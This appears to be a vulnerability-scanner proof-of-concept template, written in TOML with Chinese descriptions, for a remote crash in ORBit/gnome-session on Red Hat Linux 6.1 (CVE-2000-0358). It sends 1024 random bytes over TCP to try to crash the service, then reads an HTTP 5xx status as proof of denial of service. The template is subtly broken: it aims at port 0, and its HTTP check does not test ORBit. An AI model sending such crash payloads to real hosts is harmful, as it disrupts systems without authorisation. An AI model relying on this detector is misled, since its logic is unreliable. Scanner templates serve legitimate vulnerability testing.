[info]
id = "POC-AVE-2000-0021"
name = "Red Hat Linux 6.1 ORBit/gnome-session 远程崩溃 PoC"
author = "AVE"
severity = "medium"
tags = ["dos", "redhat", "orbit"]
description = "检测 Red Hat Linux 6.1 中 ORBit 和 gnome-session 是否存在远程程序崩溃漏洞"
vuln_id = ["CVE-2000-0358", "AVE-2000-0021"]

[poc]
logic = "all"

[[poc.requests]]
method = "TCP"
host = "{{target}}"
port = 0
read_timeout = 5
body = "{{random_bytes(1024)}}"

[[poc.requests.matchers]]
type = "network_error"
expect = true
description = "目标主机上 ORBit 服务无响应或连接被拒绝，可能存在崩溃漏洞"

[[poc.requests]]
method = "GET"
path = "/"
read_timeout = 5

[[poc.requests.matchers]]
type = "status"
status = [0, 500, 502, 503, 504]
expect = true
description = "服务异常响应，可能存在拒绝服务漏洞"
